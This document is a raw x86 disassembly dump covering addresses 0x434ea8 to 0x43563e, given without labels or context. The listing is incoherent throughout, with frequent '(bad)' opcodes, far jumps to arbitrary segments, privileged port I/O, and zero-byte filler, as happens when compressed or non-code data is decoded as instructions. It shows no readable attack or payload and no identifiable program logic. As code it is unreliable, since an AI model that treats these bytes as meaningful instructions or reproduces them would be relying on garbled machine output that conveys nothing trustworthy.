  434ea8:	jmp    0x56bb:0x62fc42ef
  434eaf:	jge    0x434e82
  434eb1:	jbe    0x434f04
  434eb3:	push   cs
  434eb4:	jb     0x434ed9
  434eb6:	fimul  DWORD PTR [edi]
  434eb8:	mov    edi,0x2f85c918
  434ebd:	int    0x83
  434ebf:	rcr    dh,0xf2
  434ec2:	cdq    
  434ec3:	add    cl,ch
  434ec5:	jbe    0x434e96
  434ec7:	inc    ebx
  434ec8:	or     eax,0x625c3bec
  434ecd:	mov    edx,0x853785ce
  434ed2:	rol    DWORD PTR [edx+0x0],0x0
  434ed6:	add    eax,DWORD PTR [eax]
  434ed8:	add    BYTE PTR [eax+eax*4],cl
  434edb:	add    al,0x1
  434edd:	lock push es
  434edf:	xor    edx,eax
  434ee1:	out    dx,al
  434ee2:	jmp    0x434f06
  434ee4:	shl    BYTE PTR [ebp+0x18],1
  434ee7:	je     0x434e72
  434ee9:	adc    bl,BYTE PTR [edi+0x7d]
  434eec:	leave  
  434eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434eee:	add    eax,0x1645683
  434ef3:	leave  
  434ef4:	jmp    0x434ec4
  434ef6:	icebp  
  434ef7:	leave  
  434ef8:	push   0x0
  434efa:	add    BYTE PTR [eax],al
  434efc:	add    BYTE PTR [eax],al
  434efe:	int3   
  434eff:	sbb    DWORD PTR [ecx-0x17eaf1b0],edi
  434f05:	mov    ecx,0x8b0002a5
  434f0a:	jmp    0x10ba:0xf3e835e
  434f11:	mov    edx,ebx
  434f13:	push   cs
  434f14:	call   0xf7f0c732
  434f19:	mov    esp,DWORD PTR [edx-0x73ef8d7f]
  434f1f:	ss inc ebx
  434f21:	mov    ebx,DWORD PTR [edx]
  434f23:	push   cs
  434f24:	adc    DWORD PTR [esi-0x18],0x7a
  434f28:	ds sub al,0x87
  434f2b:	xchg   ecx,eax
  434f2c:	and    eax,0x24d06
  434f31:	cmp    ecx,DWORD PTR [edi+edi*8]
  434f34:	jns    0x434faf
  434f36:	cmp    ebp,DWORD PTR [edi+0x2a0585f7]
  434f3c:	dec    DWORD PTR [edx-0x3f05116e]
  434f42:	aaa    
  434f43:	add    al,0x2b
  434f45:	shl    BYTE PTR [esi+0x62504a06],0xde
  434f4c:	push   0x39
  434f4e:	or     al,0x2
  434f50:	or     DWORD PTR [esi+0x75],0x7
  434f54:	xchg   DWORD PTR [edx],edi
  434f56:	mul    BYTE PTR [edi+0x27b386ed]
  434f5c:	in     al,dx
  434f5d:	into   
  434f5e:	dec    BYTE PTR [esp+ebx*8-0x7b]
  434f62:	add    BYTE PTR [eax],al
  434f64:	add    BYTE PTR [eax],al
  434f66:	add    BYTE PTR [ebx+0x75105758],cl
  434f6c:	lods   al,BYTE PTR ds:[esi]
  434f6d:	add    BYTE PTR [edx-0x1e],0x64
  434f71:	fcomp  QWORD PTR [ecx-0x5a]
  434f74:	sbb    edi,DWORD PTR [ebx]
  434f76:	test   eax,ebx
  434f78:	xchg   esi,eax
  434f79:	rol    BYTE PTR [ebp-0x3f7d50d0],0x49
  434f80:	or     al,ah
  434f82:	add    BYTE PTR [ecx],0xb6
  434f85:	std    
  434f86:	push   DWORD PTR [ebp-0x25]
  434f89:	std    
  434f8a:	push   esi
  434f8c:	adc    eax,DWORD PTR [ecx]
  434f8e:	jae    0x434fc7
  434f90:	push   eax
  434f91:	dec    ebx
  434f92:	pop    esp
  434f93:	lock adc dl,BYTE PTR [ebp+0x1]
  434f97:	(bad)  
  434f98:	popf   
  434f99:	adc    eax,0xff00b5fd
  434f9e:	sub    al,0xb5
  434fa0:	push   eax
  434fa1:	xor    ebp,DWORD PTR [edi+ecx*1-0x26]
  434fa5:	sub    bh,cl
  434fa7:	(bad)  
  434fa8:	imul   esi,DWORD PTR [ebx],0xffffffe8
  434fab:	mov    WORD PTR [edx+0x1ceefffd],ss
  434fb1:	push   0xc0589b85
  434fb6:	adc    ah,bh
  434fb8:	sbb    al,0x38
  434fba:	call   0xfa19008b
  434fbf:	out    dx,al
  434fc0:	aam    0x12
  434fc2:	sar    BYTE PTR [edx+ebx*1-0xc],0x58
  434fc7:	sub    BYTE PTR [esi],0xc4
  434fca:	pop    edx
  434fcb:	add    BYTE PTR [eax],al
  434fcd:	add    BYTE PTR [eax],al
  434fcf:	add    dh,dh
  434fd1:	call   0xc744:0x2188502
  434fd8:	lock inc ebx
  434fda:	or     ecx,DWORD PTR [edi-0x3a31d159]
  434fe0:	(bad)  
  434fe1:	pop    ss
  434fe2:	fs mov dh,0x7d
  434fe5:	add    eax,0x13d4a6e
  434fea:	lods   eax,DWORD PTR ds:[esi]
  434feb:	out    dx,eax
  434fec:	repz push fs
  434fef:	outs   dx,BYTE PTR ds:[esi]
  434ff0:	jne    0x43500b
  434ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434ff3:	xor    al,0x32
  434ff5:	xor    al,0x4f
  434ff7:	mov    bh,0x9d
  434ff9:	add    ah,bh
  434ffb:	mov    fs,WORD PTR [edi]
  434ffd:	pop    esi
  434ffe:	pop    esi
  434fff:	sbb    cl,BYTE PTR [eax-0x3a]
  435002:	test   DWORD PTR [edi+eiz*1-0x3fe8b0d2],0x778f3acc
  43500d:	sub    DWORD PTR [edi+0x62fbaaf3],0x22cc9c65
  435017:	cmp    ebx,ebp
  435019:	add    ah,bh
  43501b:	add    esi,DWORD PTR [ebp+0x2c]
  43501e:	pop    esi
  43501f:	loope  0x43504f
  435021:	rcr    DWORD PTR [ebx],0xc8
  435024:	mov    cl,0xbd
  435026:	xor    ecx,eax
  435028:	test   eax,0x41c82bbd
  43502d:	mov    edi,0x30598e9c
  435032:	xchg   ecx,eax
  435033:	mov    es,WORD PTR [eax]
  435035:	add    BYTE PTR [eax],al
  435037:	add    BYTE PTR [eax],al
  435039:	out    0xfa,al
  43503b:	cmp    DWORD PTR [edi+0x3e7cc5a],ebx
  435041:	clc    
  435042:	retf   
  435043:	pop    esi
  435044:	inc    ecx
  435045:	ror    DWORD PTR ds:0x27504e1,0x36
  43504c:	daa    
  43504d:	lock int3 
  43504f:	iret   
  435050:	mov    dh,BYTE PTR [ecx]
  435052:	int3   
  435053:	add    BYTE PTR [esi-0x138bbf05],dh
  435059:	je     0x435026
  43505b:	stc    
  43505c:	jmp    0x1cc05524
  435061:	jge    0x435065
  435063:	or     DWORD PTR [ebp-0x42],ebp
  435066:	int3   
  435067:	stc    
  435068:	jmp    0x6d4d1362
  43506d:	mov    bh,0xcc
  43506f:	stc    
  435070:	jmp    0xfb411b70
  435075:	push   edx
  435076:	test   DWORD PTR [edx+0x21],eax
  435079:	repnz cmp BYTE PTR [eax+0x72],bl
  43507d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43507e:	pop    esi
  43507f:	test   edi,ebx
  435081:	cmp    BYTE PTR [ebp+0xa3c62e0],0x9
  435088:	xchg   edi,eax
  435089:	cmp    bh,bl
  43508b:	std    
  43508c:	stc    
  43508d:	mov    cl,0xed
  43508f:	inc    ecx
  435090:	xchg   ebp,eax
  435091:	add    edi,DWORD PTR [ecx]
  435093:	inc    esp
  435094:	or     cl,bl
  435096:	test   DWORD PTR [edx-0x57],edx
  435099:	icebp  
  43509a:	inc    eax
  43509b:	dec    eax
  43509c:	pop    DWORD PTR [eax]
  43509e:	add    BYTE PTR [eax],al
  4350a0:	add    BYTE PTR [eax],al
  4350a2:	jmp    0x4350aa
  4350a4:	aas    
  4350a5:	xchg   DWORD PTR [ecx],eax
  4350a7:	pop    es
  4350a8:	jbe    0x43510c
  4350aa:	cmp    al,0x5e
  4350ac:	sbb    eax,0x5285729f
  4350b1:	test   eax,0xb304916f
  4350b6:	add    edi,DWORD PTR [eax]
  4350b8:	dec    eax
  4350b9:	bound  esp,QWORD PTR [esi+eax*2+0x5ebc6262]
  4350c0:	bound  esi,QWORD PTR [eax+0x7d]
  4350c3:	inc    esp
  4350c4:	sub    DWORD PTR [ecx+0x2784e9a5],0xffffffdd
  4350cb:	test   DWORD PTR [edx-0x3],edx
  4350ce:	xchg   ecx,eax
  4350cf:	mov    edx,0x26007f
  4350d4:	stc    
  4350d5:	call   FWORD PTR [esi+ebp*8]
  4350d8:	shl    DWORD PTR [edi+0x11],0xf
  4350dc:	dec    esi
  4350dd:	call   0x433ad6
  4350e2:	pop    edx
  4350e4:	or     BYTE PTR [ecx+0x7e7b665a],cl
  4350ea:	jl     0x4350f1
  4350ec:	pop    es
  4350ed:	cmp    BYTE PTR [ecx],0x0
  4350f0:	add    BYTE PTR [eax],al
  4350f2:	push   0x7d
  4350f4:	inc    esi
  4350f5:	ins    BYTE PTR es:[edi],dx
  4350f6:	jp     0x435115
  4350f8:	inc    esi
  4350f9:	jo     0x435152
  4350fb:	push   eax
  4350fc:	mov    al,ds:0x81fecc16
  435101:	inc    esi
  435102:	lods   al,BYTE PTR ds:[esi]
  435103:	jge    0x4350bb
  435105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435106:	add    BYTE PTR [eax],al
  435108:	add    BYTE PTR [eax],al
  43510a:	add    dl,cl
  43510c:	(bad)  
  43510d:	dec    DWORD PTR [esi]
  43510f:	jmp    0x4350c7
  435111:	pop    esi
  435112:	mov    DWORD PTR [eax+0x54968311],esp
  435118:	sar    cl,1
  43511a:	jmp    DWORD PTR [edi]
  43511c:	push   0xfe9c16a0
  435121:	sub    eax,DWORD PTR [ebx]
  435123:	adc    al,0x2
  435125:	xor    al,BYTE PTR [ecx]
  435127:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435129:	push   cs
  43512a:	add    BYTE PTR [ecx+edi*8+0x7093c0ad],bl
  435131:	nop
  435132:	loopne 0x43510a
  435134:	add    BYTE PTR ds:[esi-0x73],ah
  435138:	push   edx
  435139:	mov    ds,WORD PTR [eax-0x72fff9a8]
  43513f:	fcom   DWORD PTR [eax+ebx*4+0x4]
  435143:	dec    esp
  435144:	push   es
  435145:	jns    0x435108
  435147:	push   ebx
  435148:	stos   DWORD PTR es:[edi],eax
  435149:	add    BYTE PTR [eax],al
  43514b:	adc    al,0x6
  43514d:	stc    
  43514e:	push   DWORD PTR [ebp-0x25]
  435151:	pop    edi
  435152:	xor    eax,0x9082d2d
  435157:	add    dl,BYTE PTR [ebx-0x440b4df8]
  43515d:	inc    ebp
  43515e:	inc    eax
  43515f:	jne    0x435125
  435161:	add    cl,BYTE PTR [ecx]
  435163:	jmp    0x8fd0:0x72e6be6a
  43516a:	jle    0x435181
  43516c:	adc    eax,DWORD PTR [eax+eax*1+0x0]
  435170:	add    BYTE PTR [eax],al
  435172:	add    BYTE PTR [eax],al
  435174:	xchg   ebx,eax
  435175:	fidiv  DWORD PTR [ecx-0x7e]
  435178:	in     eax,dx
  435179:	loop   0x435178
  43517b:	(bad)  
  43517c:	out    dx,al
  43517d:	pop    ecx
  43517e:	jno    0x435192
  435180:	jne    0x43515d
  435182:	adc    al,0xc7
  435184:	sahf   
  435185:	pushf  
  435186:	push   ss
  435187:	adc    BYTE PTR ds:0xeefffdb2,0x99
  43518e:	pop    ebp
  43518f:	or     ecx,ebp
  435191:	sbb    ah,BYTE PTR [esi]
  435193:	inc    edx
  435194:	inc    ecx
  435195:	fs (bad) 
  435197:	test   DWORD PTR [ebx],esi
  435199:	scas   eax,DWORD PTR es:[edi]
  43519a:	sbb    al,0x82
  43519c:	cmc    
  43519d:	(bad)  
  43519f:	jmp    FWORD PTR [edx]
  4351a1:	jo     0x435127
  4351a3:	div    DWORD PTR [esi-0x73]
  4351a6:	xor    ecx,DWORD PTR [eax-0x14]
  4351a9:	mov    eax,ds:0x6f38ff5d
  4351ae:	mov    WORD PTR [edx+0x21],ss
  4351b1:	push   esp
  4351b2:	aaa    
  4351b3:	dec    eax
  4351b4:	(bad)  
  4351b5:	mov    eax,ds:0xb33b8535
  4351ba:	or     BYTE PTR [edx-0x32fc22cf],dh
  4351c0:	push   esi
  4351c1:	push   esp
  4351c2:	inc    edi
  4351c3:	inc    esp
  4351c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4351c5:	sbb    al,0x24
  4351c7:	inc    edx
  4351c8:	leave  
  4351c9:	fs aaa 
  4351cb:	xor    al,0xec
  4351cd:	add    DWORD PTR [ecx],ebp
  4351cf:	dec    esp
  4351d0:	jl     0x435163
  4351d2:	jecxz  0x435218
  4351d4:	push   0x2e5eac
  4351d9:	add    BYTE PTR [eax],al
  4351db:	add    BYTE PTR [eax],al
  4351dd:	mov    ch,0x60
  4351df:	pusha  
  4351e0:	add    BYTE PTR [ebx-0x5ec18607],ah
  4351e6:	jge    0x435211
  4351e8:	dec    esp
  4351e9:	lock das 
  4351eb:	sub    ebx,DWORD PTR [esi-0x6]
  4351ee:	std    
  4351ef:	sbb    al,0xd7
  4351f1:	scas   eax,DWORD PTR es:[edi]
  4351f2:	bound  ebx,QWORD PTR [esi+0x5]
  4351f5:	jne    0x4351f9
  4351f7:	out    0x50,eax
  4351f9:	(bad)  
  4351fa:	fisub  DWORD PTR [esi+0x4]
  4351fd:	jne    0x435201
  4351ff:	call   0x19c0db41
  435204:	sbb    al,0xf0
  435206:	or     ecx,DWORD PTR cs:[ebx+0x3eaa2a3f]
  43520d:	push   ebp
  43520e:	add    ah,bh
  435210:	add    esi,DWORD PTR [ebp-0x7]
  435213:	cwde   
  435214:	add    bh,dl
  435216:	aas    
  435217:	scas   eax,DWORD PTR es:[edi]
  435218:	mov    dl,0xd5
  43521a:	clc    
  43521b:	cwde   
  43521c:	dec    edx
  43521d:	ret    0x2813
  435220:	and    esi,DWORD PTR [edi]
  435222:	cs jo  0x435263
  435225:	cmp    eax,0x478a9cdd
  43522a:	push   esi
  43522b:	pop    esi
  43522c:	ds pop ebp
  43522e:	jl     0x435213
  435230:	add    eax,esi
  435232:	ja     0x43527b
  435234:	out    dx,al
  435235:	xchg   edx,eax
  435236:	enter  0x6e6e,0xd1
  43523a:	out    dx,eax
  43523b:	out    0x3,al
  43523d:	push   eax
  43523e:	leave  
  43523f:	or     DWORD PTR [eax+eax*1+0x0],0x6e6e3c39
  43524a:	adc    eax,0xf003e6f1
  43524f:	js     0x435251
  435251:	push   ecx
  435252:	push   ebx
  435253:	enter  0x61f9,0x75
  435257:	idiv   esi
  435259:	xchg   BYTE PTR [esi],dl
  43525b:	cmc    
  43525c:	(bad)  
  43525d:	call   0x5003e6d5
  435262:	js     0x4352ca
  435264:	xor    BYTE PTR [ebp+0x76],0x2
  435268:	add    BYTE PTR [edx-0x8],dh
  43526b:	data16 adc ch,cl
  43526e:	jbe    0x4352eb
  435270:	test   BYTE PTR [edi-0x6e],ch
  435273:	add    al,BYTE PTR [eax]
  435275:	jmp    0xb2690b01
  43527a:	jno    0x4352f8
  43527c:	mov    al,ds:0x90276f7
  435281:	jge    0x4352b7
  435283:	retf   0x154a
  435286:	out    dx,al
  435287:	sar    bh,1
  435289:	es pop ebp
  43528b:	cmp    ecx,0xffffffee
  43528e:	push   0xffffffbc
  435290:	sti    
  435291:	jbe    0x43525e
  435293:	jge    0x4352df
  435295:	or     eax,0xee78bff4
  43529a:	inc    DWORD PTR [eax+edi*1-0x16]
  43529e:	mov    cl,0xdd
  4352a0:	(bad)  
  4352a1:	sbb    DWORD PTR [ecx+0x4cbd527d],edi
  4352a7:	add    ah,BYTE PTR ds:0x18
  4352ad:	add    BYTE PTR [eax],al
  4352af:	xor    dl,BYTE PTR fs:[edx+0x51]
  4352b3:	adc    DWORD PTR [eax+eax*1],0xffffffe9
  4352b7:	out    dx,eax
  4352b8:	inc    esp
  4352b9:	ins    BYTE PTR es:[edi],dx
  4352ba:	bound  eax,QWORD PTR [eax+0x1f9c445]
  4352c0:	inc    ebp
  4352c1:	pop    esp
  4352c2:	adc    DWORD PTR [ebx],eax
  4352c4:	retf   0x16f9
  4352c7:	out    dx,eax
  4352c8:	cld    
  4352c9:	jl     0x43525b
  4352cb:	xchg   bh,al
  4352cd:	or     al,BYTE PTR [eax]
  4352cf:	loope  0x435325
  4352d1:	cmc    
  4352d2:	jmp    FWORD PTR [ebx+0xd]
  4352d5:	push   esi
  4352d6:	xor    ecx,DWORD PTR [esp+ecx*1+0x5d7c355]
  4352dd:	ins    BYTE PTR es:[edi],dx
  4352de:	mov    eax,DWORD PTR [ecx+eax*4]
  4352e1:	clc    
  4352e2:	add    ch,BYTE PTR [esi+0x4c02b2c7]
  4352e8:	add    eax,DWORD PTR [eax]
  4352ea:	sub    DWORD PTR [ecx-0x5576fc06],0x72
  4352f1:	push   cs
  4352f2:	add    BYTE PTR [eax+edi*1],bl
  4352f5:	xor    eax,0x7d0a828b
  4352fa:	shl    BYTE PTR [ebp+eax*8-0x7c],cl
  4352fe:	dec    esi
  4352ff:	adc    al,0x2
  435301:	ret    0x1eeb
  435304:	repnz rcl BYTE PTR [ebx+0x37],0xc1
  435309:	push   eax
  43530a:	push   ecx
  43530b:	inc    edx
  43530c:	(bad)  
  43530d:	fidiv  WORD PTR ds:0x568302dc
  435313:	add    BYTE PTR [eax],al
  435315:	add    BYTE PTR [eax],al
  435317:	add    BYTE PTR [eax+0x79],bh
  43531a:	adc    DWORD PTR ss:[eax],0xffffffce
  43531e:	adc    BYTE PTR [esi+0x68],0xd6
  435322:	ds clc 
  435324:	pop    ebx
  435325:	lods   eax,DWORD PTR ds:[esi]
  435326:	add    DWORD PTR [esi],0x6f
  435329:	mov    ebx,0xdbc4831
  43532e:	pop    es
  43532f:	xchg   ebp,eax
  435330:	lea    edx,[eax]
  435332:	push   ebx
  435333:	(bad)  
  435334:	fld    QWORD PTR [eax]
  435336:	push   ebp
  435337:	ret    
  435338:	pop    ds
  435339:	jo     0x4352db
  43533b:	push   ss
  43533c:	mov    WORD PTR [edx],es
  43533e:	add    BYTE PTR [esp+eiz*4+0x79],dh
  435342:	dec    esi
  435343:	pop    esp
  435344:	and    DWORD PTR [eax+edi*2+0x38400707],edx
  43534b:	add    esi,DWORD PTR [ebp+0x23]
  43534e:	out    0xfe,eax
  435350:	inc    edi
  435351:	and    ah,BYTE PTR [esi+0x0]
  435354:	sahf   
  435355:	sbb    DWORD PTR [edi+ecx*2],esi
  435358:	ret    
  435359:	repz jb 0x43538f
  43535c:	jne    0x435339
  43535e:	mov    BYTE PTR [edx-0x37],dl
  435361:	pusha  
  435362:	adc    bh,BYTE PTR [ebp+0x39]
  435365:	int3   
  435366:	xchg   BYTE PTR [edx-0x57],dl
  435369:	mov    bl,0xd4
  43536b:	icebp  
  43536c:	inc    edx
  43536d:	lods   eax,DWORD PTR ds:[esi]
  43536e:	mov    BYTE PTR [edx],al
  435370:	div    BYTE PTR [ebx]
  435372:	hlt    
  435373:	inc    DWORD PTR [ebx+0x2af95d57]
  435379:	test   DWORD PTR [edx+ebx*2],esi
  43537c:	add    BYTE PTR [eax],al
  43537e:	add    BYTE PTR [eax],al
  435380:	add    dh,ch
  435382:	cwde   
  435383:	cmp    BYTE PTR [ebx+0x36],bl
  435386:	push   0x9041ccc1
  43538b:	ror    esp,0x39
  43538e:	cwde   
  43538f:	ror    esp,0x31
  435392:	pop    es
  435393:	xchg   esp,ebp
  435395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435396:	or     eax,0xe47d7387
  43539b:	xchg   esi,eax
  43539c:	(bad)  
  43539d:	jmp    0x4360:0xe284fddb
  4353a4:	je     0x43539a
  4353a6:	push   edx
  4353a7:	sti    
  4353a8:	(bad)  
  4353a9:	rcr    bl,cl
  4353ab:	push   eax
  4353ac:	and    al,0xfe
  4353ae:	and    eax,0x2cbc5ae5
  4353b3:	aam    0x85
  4353b5:	sub    ebp,DWORD PTR [edi-0x25840882]
  4353bb:	std    
  4353bc:	jmp    DWORD PTR [esi]
  4353be:	rol    DWORD PTR [eax+0x4db717b],1
  4353c4:	test   BYTE PTR [ecx-0x27],cl
  4353c7:	std    
  4353c8:	(bad)  
  4353c9:	clc    
  4353ca:	add    dh,BYTE PTR [eax]
  4353cc:	add    al,0xf1
  4353ce:	lods   al,BYTE PTR ds:[esi]
  4353cf:	in     eax,0x3
  4353d1:	jne    0x4353e4
  4353d3:	daa    
  4353d4:	add    BYTE PTR [edx-0x7b56aff],0x3b
  4353db:	scas   eax,DWORD PTR es:[edi]
  4353dc:	mov    BYTE PTR [edi-0x2ed291d6],bh
  4353e2:	jns    0x435455
  4353e4:	sldt   WORD PTR [eax]
  4353e7:	add    BYTE PTR [eax],al
  4353e9:	add    BYTE PTR [eax],ch
  4353eb:	loop   0x43544b
  4353ed:	inc    ebp
  4353ee:	(bad)  
  4353ef:	cmc    
  4353f0:	cwde   
  4353f1:	inc    eax
  4353f2:	jp     0x4353f4
  4353f4:	push   ss
  4353f5:	lds    esp,FWORD PTR [eax+0x3c]
  4353f8:	cmp    edi,DWORD PTR [edi-0x51]
  4353fb:	ds push es
  4353fd:	into   
  4353fe:	clc    
  4353ff:	sub    esp,DWORD PTR [edi]
  435401:	jge    0x4353ba
  435403:	cmp    al,BYTE PTR [ecx+0x7f]
  435406:	jns    0x43544b
  435408:	dec    ecx
  435409:	jge    0x43547c
  43540b:	dec    eax
  43540c:	pop    esi
  43540d:	inc    edx
  43540e:	mov    eax,ds:0xf0183121
  435413:	sub    esp,DWORD PTR [edi]
  435415:	add    eax,esp
  435417:	std    
  435418:	sbb    al,0x7f
  43541a:	scas   eax,DWORD PTR es:[edi]
  43541b:	cmp    bl,BYTE PTR [esi+0x3a]
  43541e:	cmp    DWORD PTR [esi+ebp*2+0x52],ebx
  435422:	pop    ecx
  435423:	pop    esp
  435424:	jo     0x435436
  435426:	cmp    edi,DWORD PTR [ecx+0x21]
  435429:	fs lock sub esi,edi
  43542d:	xchg   edx,eax
  43542e:	rol    esp,cl
  435430:	out    0x3,eax
  435432:	repnz xor ebx,edi
  435435:	jl     0x43545e
  435437:	pop    esi
  435438:	pusha  
  435439:	push   edx
  43543a:	push   ebp
  43543b:	jg     0x435464
  43543d:	pop    eax
  43543e:	cmp    ecx,DWORD PTR [ecx]
  435440:	jno    0x4353c6
  435442:	jne    0x435446
  435444:	out    0x56,eax
  435446:	arpl   WORD PTR [ecx+0x0],di
  435449:	lahf   
  43544a:	cmp    bh,BYTE PTR [edi+0x4a]
  43544d:	std    
  43544e:	add    BYTE PTR [eax],al
  435450:	add    BYTE PTR [eax],al
  435452:	add    BYTE PTR [ebx-0x4e],dh
  435455:	jg     0x435467
  435457:	jg     0x43541e
  435459:	stc    
  43545a:	jmp    0xd9b509d2
  43545f:	inc    esi
  435460:	xor    al,ch
  435462:	mov    cl,0x81
  435464:	add    al,BYTE PTR [eax]
  435466:	push   0x3d
  435468:	sti    
  435469:	xchg   BYTE PTR [edi-0x1307ba2a],ah
  43546f:	mov    edi,0xd14f36e8
  435474:	add    al,BYTE PTR [eax]
  435476:	jmp    0xe1c04a1d
  43547b:	jnp    0x4354cc
  43547d:	punpckldq mm7,DWORD PTR [esi+edx*2+0x25]
  435482:	aaa    
  435483:	leave  
  435484:	inc    ebx
  435485:	imul   cl
  435487:	es (bad) 
  435489:	stc    
  43548a:	aaa    
  43548b:	jp     0x435508
  43548d:	jp     0x4354d8
  43548f:	call   0xac6:0x3e6a7840
  435496:	imul   edx,DWORD PTR [ebp+0x71e9f9c3],0x40
  43549d:	pusha  
  43549e:	out    0xef,al
  4354a0:	pop    esi
  4354a1:	(bad)  
  4354a2:	call   0x1fc8b51d
  4354a7:	push   ebp
  4354a8:	pusha  
  4354a9:	and    eax,0x427d4d17
  4354ae:	add    eax,0x774385a
  4354b3:	jb     0x43546a
  4354b5:	test   DWORD PTR [edi+0x0],eax
  4354bb:	add    BYTE PTR [edx],dl
  4354bd:	icebp  
  4354be:	(bad)  
  4354bf:	call   0x544b9bb9
  4354c4:	cmp    BYTE PTR [eax+0x78],al
  4354c7:	fimul  WORD PTR [edi]
  4354c9:	mov    ebp,0x9f4a0085
  4354ce:	push   cs
  4354cf:	add    BYTE PTR [ecx+ebx*2+0x44ff0c81],cl
  4354d6:	xchg   esi,eax
  4354d7:	mov    al,ds:0x8affffaa
  4354dc:	or     dl,BYTE PTR [edi+0xe]
  4354df:	add    BYTE PTR [ebx+eiz*8-0x2a777806],cl
  4354e6:	or     BYTE PTR [esi-0x68b64],dh
  4354ec:	pop    esp
  4354ed:	(bad)  
  4354ee:	clc    
  4354ef:	popf   
  4354f0:	lods   al,BYTE PTR ds:[esi]
  4354f1:	leave  
  4354f2:	stc    
  4354f3:	call   DWORD PTR [ebx+0x69]
  4354f6:	nop
  4354f7:	loopne 0x43550f
  4354f9:	aas    
  4354fa:	add    BYTE PTR [esi+0x5d],ah
  4354fd:	push   ebx
  4354fe:	mov    ds,WORD PTR [eax-0x730000a8]
  435504:	enter  0x9848,0x4
  435508:	sbb    al,0xff
  43550a:	js     0x4354cd
  43550c:	xor    esi,DWORD PTR [ecx-0x20c0000]
  435512:	clc    
  435513:	dec    DWORD PTR [ecx+ebx*2]
  435516:	xor    ecx,eax
  435518:	dec    edi
  435519:	add    al,BYTE PTR [edi]
  43551b:	mov    bh,0xc5
  43551d:	add    BYTE PTR [esi+0x81],ch
  435523:	add    BYTE PTR [eax],al
  435525:	in     al,dx
  435526:	add    eax,0xc2f70040
  43552b:	or     BYTE PTR [edi+0x7e2bf2d],dh
  435531:	jecxz  0x43559b
  435533:	jp     0x435515
  435535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435536:	add    BYTE PTR ds:[esi-0x33],ah
  43553a:	push   edx
  43553b:	jle    0x4354c5
  43553d:	aad    0xfe
  43553f:	dec    DWORD PTR [edx+0xe525a]
  435545:	int3   
  435546:	in     eax,0xba
  435548:	xor    esi,DWORD PTR [ebp+0x22]
  43554b:	add    eax,0xfdcad582
  435550:	(bad)  
  435551:	(bad)  
  435552:	xchg   edx,eax
  435553:	inc    ebp
  435554:	or     DWORD PTR [ecx],ecx
  435556:	sbb    bh,BYTE PTR [ebx-0x33]
  435559:	dec    esi
  43555a:	jmp    0x584ca75b
  43555f:	(bad)  
  435560:	cli    
  435561:	cld    
  435562:	xchg   edx,eax
  435563:	inc    ebp
  435564:	xchg   DWORD PTR [eax],esi
  435566:	sar    DWORD PTR [edx+0x47],1
  435569:	jne    0x435545
  43556b:	das    
  43556c:	ins    BYTE PTR es:[edi],dx
  43556d:	(bad)  
  43556e:	jns    0x4355c9
  435570:	xor    eax,0x850f4142
  435575:	mov    ebx,0xbd4a7c73
  43557a:	and    al,0x2e
  43557c:	xor    al,0x26
  43557e:	or     al,0x7b
  435580:	dec    edx
  435581:	lea    edi,[eax-0x529bb369]
  435587:	adc    al,0xbf
  435589:	add    BYTE PTR [eax],al
  43558b:	add    BYTE PTR [eax],al
  43558d:	add    BYTE PTR [esi-0x3c7ac80f],dl
  435593:	out    0x74,eax
  435595:	inc    edx
  435596:	mov    ebp,0xb40498b8
  43559b:	or     al,0xaa
  43559d:	test   ebx,eax
  43559f:	jmp    0x435606
  4355a1:	xchg   DWORD PTR [ecx+0x15],edi
  4355a4:	push   DWORD PTR [eax+0x4a7b17b3]
  4355aa:	lods   eax,DWORD PTR ds:[esi]
  4355ab:	xor    al,0x37
  4355ad:	inc    esp
  4355ae:	xchg   ebx,eax
  4355af:	and    al,BYTE PTR [ecx]
  4355b1:	inc    esi
  4355b2:	cs stos DWORD PTR es:[edi],eax
  4355b4:	std    
  4355b5:	push   DWORD PTR [ebp-0x78]
  4355b8:	aas    
  4355b9:	js     0x435623
  4355bb:	cld    
  4355bc:	std    
  4355bd:	pop    ecx
  4355be:	dec    ecx
  4355bf:	sub    al,0x4a
  4355c1:	or     BYTE PTR [ebp+0x24],dh
  4355c4:	inc    edi
  4355c5:	ins    BYTE PTR es:[edi],dx
  4355c6:	mov    dl,0x2
  4355c8:	test   eax,0xe702755b
  4355cd:	add    esi,DWORD PTR [eax+ecx*2+0x27505c7]
  4355d4:	out    0x0,eax
  4355d6:	icebp  
  4355d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4355d8:	inc    esp
  4355d9:	rcr    BYTE PTR [ebp+ecx*4-0x2b09d06f],1
  4355e0:	scas   eax,DWORD PTR es:[edi]
  4355e1:	or     al,bh
  4355e3:	push   eax
  4355e4:	out    dx,eax
  4355e5:	add    al,0xb3
  4355e7:	lods   eax,DWORD PTR ds:[esi]
  4355e8:	in     eax,0x14
  4355ea:	mov    edx,0xbb1ce72c
  4355ef:	push   edx
  4355f0:	mov    eax,0x39
  4355f5:	add    BYTE PTR [eax],al
  4355f7:	pop    ebp
  4355f8:	jmp    0x4355cf
  4355fa:	add    esi,DWORD PTR [ebp-0x73]
  4355fd:	mov    cl,0x5f
  4355ff:	clc    
  435600:	jmp    DWORD PTR [ebp-0x39]
  435603:	test   DWORD PTR [ebx-0x74a2d05f],ecx
  435609:	hlt    
  43560a:	iret   
  43560b:	dec    esp
  43560c:	(bad)  
  43560d:	stc    
  43560e:	or     bl,0x12
  435611:	out    0xfe,eax
  435613:	imul   DWORD PTR [esi-0x2c]
  435616:	iret   
  435617:	sub    al,0x61
  435619:	sub    DWORD PTR [ebx],edx
  43561b:	xor    eax,0xa0c3245d
  435620:	inc    eax
  435621:	dec    edi
  435622:	add    al,0x6c
  435624:	xchg   BYTE PTR [esi+0x4],dl
  435627:	jne    0x43562b
  435629:	pop    esi
  43562a:	inc    esi
  43562b:	cdq    
  43562c:	lea    esi,[ecx]
  43562e:	or     al,0xfb
  435630:	inc    ebp
  435631:	out    dx,eax
  435632:	into   
  435633:	lock xchg edi,eax
  435635:	inc    edi
  435636:	div    dl
  435638:	rcr    BYTE PTR [esi+0x7e],0x11
  43563c:	sbb    bh,ah
  43563e:	add    edx,DWORD PTR [eax-0x6682fe3f]
